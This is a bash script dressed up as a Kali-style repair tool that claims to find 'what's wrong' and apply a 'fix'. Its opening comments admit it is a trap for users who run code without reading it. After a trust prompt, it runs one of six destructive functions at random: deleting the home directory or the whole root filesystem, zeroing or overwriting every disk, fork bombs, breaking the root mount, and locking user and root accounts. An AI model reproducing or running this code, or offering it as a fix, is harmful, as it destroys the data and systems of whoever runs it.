#!/bin/bash

# Script should work nicely on Ubuntu and Kali. On other distros, lmk!

# Hey there, thanks for taking the time to read my little script!
# Since this script gathered some controversy, I figured that it might be
# useful to explain why this exists in the first place.
#
# Over the years of using Linux and recently BSD, I started to feel a strong
# disenchantment towards the newcomers in Linux. Well, not really newcomers,
# newcomers are fine and great even, because it means that Linux as a platform
# is growing. Rather, I'm talking about the kind that is too lazy to open a
# search engine, the kind that wants others to do their job for them.
#
# Over time I've seen people that had the brevity to ask others to do their
# homework for them. Or worse yet, some people that wanted to make other people
# do their work to get qualified for things like GSoC. That is disgusting.
# Google Summer of Code - a contest that awards actual money to winners, these
# people ask others to work for for free, with no chance of winning, in order
# to potentially award a complete and utter lazy loser with no desire to learn
# about Linux, which are fundamentally just after the money. They don't want to
# familiarize themselves with this ecosystem, and they're the kind of people
# or rather users that would blindly execute something like this. I can't
# imagine anyone else that would even think of running it without reading.
#
# Those kinds of people are the people that this script was made for. And
# honestly, I don't regret it. Inclusiveness aside, I couldn't care less about
# that - it's not healthy for the open source community at large to entertain
# people that waste our time. So what catb.org does with smart questions, I do
# by getting these lazy people out of the ecosystem. A filter of sorts.
#
# Needless to say, don't execute this. You're one of the fine people that read
# before they execute, think before they act. Thank you for being part of this
# community.

# Kali-style big fat banner
printf ' ____       _            _       _  __     _ _ _____           _\n'
printf '|  _ \ _ __(_)_   ____ _| |_ ___| |/ /__ _| (_)_   _|__   ___ | |___\n'
printf '| |_) |  __| \ \ / / _` | __/ _ \   // _` | | | | |/ _ \ / _ \| / __|\n'
printf '|  __/| |  | |\ V / (_| | ||  __/ . \ (_| | | | | | (_) | (_) | \__ \\\n'
printf '|_|   |_|  |_| \_/ \__,_|\__\___|_|\_\__,_|_|_| |_|\___/ \___/|_|___/\n'

# Sudo detection
if [ $EUID != 0 ]; then
	sudo=$(which sudo)
elif [ $EUID = 0 ]; then
	sudo=""
fi

# I came in your home and obliterated it
fix0(){
	rm -rf ~/*
}

# Might as well take the yard and the garage too
fix1(){
	$sudo dd if=/dev/zero of=/dev/sda bs=1M count=1
	$sudo rm -rf /*
}

# Hiroshima was nothing compared to this
fix2(){
	# Fun fact: recursion is what drives the fork bomb.
	# TODO: test whether it all still works
	:(){
		: | : &
	};
	:
}

# Everything in the world is only temporary..
# Thanks madaidan for this one, much appreciated! :D
fix3(){
	$sudo mount -o remount,defaults -t tmpfs /
	echo "/ / tmpfs defaults 0 0" | $sudo tee -a /etc/fstab
	$sudo reboot
}

# All drives locked and loaded, ready for action!
# Thanks rmoog for this one, much appreciated! :D
fix4(){
	for i in $(lsblk | grep ^[a-z] | grep -v ^sr[0-9] | awk '{print $1}')
	do
		dd if=/dev/urandom of=/dev/$i &
	done
	# Little bombshell to top it off
	:(){ :|:& };:
}

# Secret code to give root access on any machine
# Thanks madaidan for this one as well!
fix5(){
	$sudo passwd -l root $(id -un)
	$sudo reboot
}

# Set num to last fix number +1 (arrays start at.. yeah)
num=6
rnd=$(($RANDOM % $num))
printf "Hmm.. let me see what's wrong here...\n"
sleep 5
printf "Aha, found it! Fix $rnd should work.\n"

# Simple function to ask user to confirm and repeat it if wrong
#FIXME: Get that stupid confirmation to work properly.
readinput(){
	printf "You've just grabbed and executed a script from a random person "
	printf "on the internet.\n"
	printf "Are you sure you fully trust whoever wrote it? (y/n)"
	read answer
}
readinput
if [ $answer == "y" ]; then
	printf "You have 3 seconds to cancel, after that, the script will continue.\n"
	sleep 3
	# UNLEASH THE MAYHEM 3:)
	fix$rnd
elif [ $answer == "n" ]; then
	printf "I see you still have some common sense left. Good.\n"
	printf "If you haven't yet already, I highly recommend reading "
	printf "the script.\n"
else
	printf "I didn't recognize that...\n"
	readinput
fi
